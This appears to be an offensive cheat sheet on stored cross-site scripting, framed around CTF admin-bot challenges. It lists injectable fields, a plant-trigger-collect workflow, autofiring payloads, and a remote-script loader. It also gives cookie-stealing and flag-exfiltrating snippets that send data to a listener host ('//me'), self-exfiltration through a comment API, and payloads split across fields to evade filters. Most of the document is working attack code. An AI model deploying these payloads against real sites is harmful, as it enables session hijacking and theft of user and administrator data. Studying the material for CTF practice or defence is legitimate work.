# Stored XSS — payloads that wait for a viewer

Stored XSS persists server-side — a comment, a username, a profile
field, a filename — then fires when a victim (usually an admin bot)
renders it. The payload lives on the server; the code runs in the
victim's session.

---

## 1. The stored-field inventory — where to plant

```text
comments / posts / reviews          — text fields → HTML context
username / display name              — rendered in nav/profile/post
profile bio / signature / location   — user-controlled markup
avatar / image filename              — the filename IS a field
email / phone / address              — "untrusted" fields, less checked
order notes / support tickets        — ticket body
product name / description           — catalog content
chat / DM messages                   — message content
report-reason / flag-content fields  — the "reason" text
file upload names                    — upload-xss.md §4
```

The pattern: anywhere user input is saved and later rendered in
another user's (or the admin's) page.

---

## 2. The two viewers — public and admin

```text
public stored XSS:   other users render it → session theft at scale
admin stored XSS:    the admin/mod bot renders it → flag steal
```

The admin-bot flow is the CTF standard — the flag lives in the
admin's page/cookie; your stored payload runs in their browser.

---

## 3. The plant→trigger→collect loop

```text
1. PLANT   — write the payload into the stored field
             via the form / API / filename / registration
2. WAIT    — the field persists; the trigger happens when the
             admin/mod renders the page containing it
3. TRIGGER — the bot loads the page; your payload runs in
             their session
4. COLLECT — the payload exfils (cookie/flag/DOM) to your listener,
             or writes it into a resource you can read
```

For CTF admin bots — usually a "report this URL" endpoint — you
don't get to see the trigger; your listener sees the exfil instead.

---

## 4. The payload shapes — stored-context set

```html
<!-- the standard set — all autofire: -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

The stored variant of the carrier pattern — the stored piece is a
tiny loader:

```html
<img src=x onerror="eval(location.hash.slice(1))">
   -- the URL carries the real payload:
   https://target/page#alert(document.cookie)
<img src=x onerror="eval(name)">
   -- the opener's window.name carries it (if you control the opener)
<img src=x onerror="fetch('//me/x.js').then(r=>r.text()).then(eval)">
   -- remote-script loader
```

---

## 5. The admin-bot chain — cookie-steal and flag-read

```javascript
// the stored payload:
<img src=x onerror="
  fetch('//me/?c='+encodeURIComponent(document.cookie))
">

// reading the flag from the admin's page:
<img src=x onerror="
  fetch('/flag').then(r=>r.text()).then(t=>
    fetch('//me/?f='+encodeURIComponent(t)))
">

// when connect-src blocks outbound — write it into YOUR account:
<img src=x onerror="
  fetch('/flag').then(r=>r.text()).then(f=>
    fetch('/api/comment',{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({post_id:YOUR_POST,body:f})}))
">
   -- then read the comment with YOUR session
```

`exfil-methods.md` §5 is the full self-exfil method.

---

## 6. The blind-detection problem — you never see the render

You can't see whether the stored payload fired — detect via
side-effects:

```javascript
<img src=x onerror="fetch('//me/fired')">
   -- a GET to your listener = it fired
   -- no GET = either filtered or not yet rendered

<svg onload="new Image().src='//me/svg-fired'">
   -- alt channel to distinguish filter vs not-fired

// the multi-marker approach — different marker per field:
// comment field: //me/?where=comment
// username field: //me/?where=username
```

Each listener hit carries the marker — you know WHICH field and
WHICH page fired.

---

## 7. The trigger-page enumeration — where the field renders

```text
comment     → the post's comment list (public page, bot visits)
username    → every post you make, your profile, nav bars
avatar      → your profile, post headers
bio         → your profile page
support ticket → the admin's ticket view
report reason → the admin's moderation queue
```

For the admin-bot trigger — the bot usually visits the REPORTED
page — so plant the payload where the reported page renders it:
your own post, your own profile, your own comment.

---

## 8. Multi-stage stored XSS — split the payload

When the field is length-capped or filtered per-field:

```html
<!-- comment field 1: -->
<script>var p='';
<!-- comment field 2: -->
p+='ale';p+='rt';
<!-- comment field 3: -->
p+='(1)';eval(p);</script>
```

Or the two-field split — username+avatar fields that render
together in a header:

```html
username: <img src=x
avatar:   onerror=alert(1)>
   -- renders as: <div>Alice <img src=x  /  onerror=alert(1)></div>
      — the img tag spans both fields
```

The tag-splitting trick — one field carries `<img src=x`, the next
carries `onerror=...>` — each field alone looks benign.

---

## 9. The "hidden" stored fields — non-obvious render paths

```text
email "Name <email>" — the display-name field of an email header
user-agent stored in logs, rendered in admin dashboard
referrer stored in analytics
search-query stored in "recent searches" / autocomplete
order-item notes rendered in the order-confirmation admin view
2fa-backup-code field (name the code)
pet's name / child's name in family accounts
calendar event descriptions
```

Any string the app stores and renders in ANY page is a candidate —
especially the ones rendered in admin-only views (where devs assume
"only admins see it").

---

## 10. The stored-XSS confirmation protocol

```text
1. plant a benign <b>XSS_PROBE_x</b> in the field
2. re-render the page yourself — does it show bold or raw?
3. plant <img src=x onerror="fetch('//me/a')">
4. wait for the bot's render → listener hit or not
5. no hit → try the next payload family / the carrier pattern
```

The falsifier: after N payloads and the bot's known render-cycle,
no listener hit → the field is escaped or filtered — escalate to
mutation/bypass files rather than guessing more payloads.
